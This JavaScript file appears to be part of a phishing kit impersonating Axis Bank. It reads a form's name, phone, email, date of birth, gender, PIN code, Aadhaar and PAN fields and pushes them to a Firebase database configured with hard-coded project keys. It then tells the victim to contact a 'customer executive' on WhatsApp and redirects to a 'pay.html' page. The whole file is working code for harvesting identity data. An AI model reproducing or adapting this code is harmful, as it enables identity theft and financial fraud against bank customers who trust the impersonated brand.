// Initialize Firebase (ADD YOUR OWN DATA)
const firebaseConfig = {
  apiKey: "AIzaSyCIHqNbBqYCamH6ZlgN9NJi6Yx-FoipHBo",
  authDomain: "newaxi.firebaseapp.com",
  databaseURL: "https://newaxi-default-rtdb.firebaseio.com",
  projectId: "newaxi",
  storageBucket: "newaxi.appspot.com",
  messagingSenderId: "790901582672",
  appId: "1:790901582672:web:3355c1b519de749267da55",
};

firebase.initializeApp(firebaseConfig);

// Reference messages collection
var messagesRef = firebase.database().ref("INFO PAGE");

// Listen for form submit
document.getElementById("contactForm").addEventListener("submit", submitForm);

// Submit form
function submitForm(e) {
  e.preventDefault();

  // Get values
  var name = getInputVal("name");
  var phone = getInputVal("phone");
  var email = getInputVal("email");
  var dob = getInputVal("dob");
  var gender = getInputVal("gender");
  var pincode = getInputVal("pincode");
  var aadhar = getInputVal("aadhar");
  var pan = getInputVal("pan");

  // Save message
  saveMessage(name, phone, email, dob, gender, pincode, aadhar, pan);

  // Show alert
  // alert("Axis Bank Will Contact You Soon")
  //   // Clear form
  //   document.getElementById('contactForm').reset();
  alert(
    "Your Request Has Been Submitted Successfully, Please Contact Our Customer Executive On Whatsapp To Continue"
  );
  document.getElementById("contactForm").reset();
  window.location.assign("pay.html");
}

// Function to get get form values
function getInputVal(id) {
  return document.getElementById(id).value;
}

// Save message to firebase
function saveMessage(name, phone, email, dob, gender, pincode, aadhar, pan) {
  var newMessageRef = messagesRef.push();
  newMessageRef.set({
    name: name,
    phone: phone,
    email: email,
    dob: dob,
    gender: gender,
    pincode: pincode,
    adhar: aadhar,
    pan: pan,
  });
}
